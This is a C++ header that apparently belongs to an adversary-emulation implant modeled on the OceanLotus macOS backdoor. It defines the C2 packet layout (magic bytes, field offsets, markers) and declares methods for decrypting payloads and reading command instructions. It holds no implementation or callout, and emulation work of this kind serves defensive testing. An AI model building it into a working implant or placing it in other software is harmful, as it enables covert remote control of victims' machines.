#ifndef Communication_hpp
#define Communication_hpp

#include <vector>
#include "stdint.h"

namespace comms {
    const int HEADER_LENGTH = 82;
    const unsigned char MAGIC_BYTES[] = {0x3B, 0x91, 0x01, 0x10};
    const int PAYLOAD_LENGTH_POS = 8;
    const int KEY_LENGTH_POS = 12;
    const int INSTRUCTION_POS = 14;

    // defined if we want to implement implant header validation
    const unsigned char MARKER_1[] = {0xC2};
    const int MARKER_1A_POS = 19;
    const unsigned char MARKER_2[] = {0xE2};
    const int MARKER_2_POS = 24;
    const unsigned char MARKER_3[] = {0xFF};
    const int MARKER_1B_POS = 29;
    const int MARKER_3_POS = 75;
}

class Communication {

public:

    int payload_length;
    int key_length;
    unsigned char instruction;
    std::vector<unsigned char> key;
    std::vector<unsigned char> payload;

    /*
    Communication constructor
        About:
            Modeled after Packet::Packet. Takes in scrambled byte sequence and
            and encrypts the buffer with the provided AES key.
        Result:
            Communication object - contains encrypted buffer
        MITRE ATT&CK Techniques:
        CTI:
            https://www.trendmicro.com/en_us/research/18/d/new-macos-backdoor-linked-to-oceanlotus-found.html
        References:
    */
    Communication(std::vector<unsigned char> buf, std::vector<unsigned char> key);

    /*
    Communication constructor
        About:
            Parses the buffer values into a Communication object
        Result:
            Communication object
    */
    Communication(std::vector<unsigned char> buf);

    /*
    getPayload
        About:
            Modeled after Packet::getData. Gets and calls the Transform class
            to decrypt the payload data
        Result:
            Vector of unsigned char - decrypted C2 communication
        MITRE ATT&CK Techniques:
        CTI:
            https://www.trendmicro.com/en_us/research/18/d/new-macos-backdoor-linked-to-oceanlotus-found.html
        References:
    */
    static std::vector<unsigned char> getPayload(Communication packet);

    /*
    getInstruction
        About:
            Modeled after Packet::getCommand. Gets the command instruction from
            the Communication packet
        Result:
            uint8_t - one byte long code containing instruction to perform
        MITRE ATT&CK Techniques:
        CTI:
            https://www.trendmicro.com/en_us/research/18/d/new-macos-backdoor-linked-to-oceanlotus-found.html
        References:
    */
    static uint8_t getInstruction(Communication packet);

    /*
    getKey
        About:
            Gets the key used for decryption of the payload and encryption of
            the response
        Result:
            Vector of unsigned char - key bytes
        MITRE ATT&CK Techniques:
        CTI:
        References:
    */
   static std::vector<unsigned char> getKey(Communication packet);
};

#endif /* Communication_hpp */
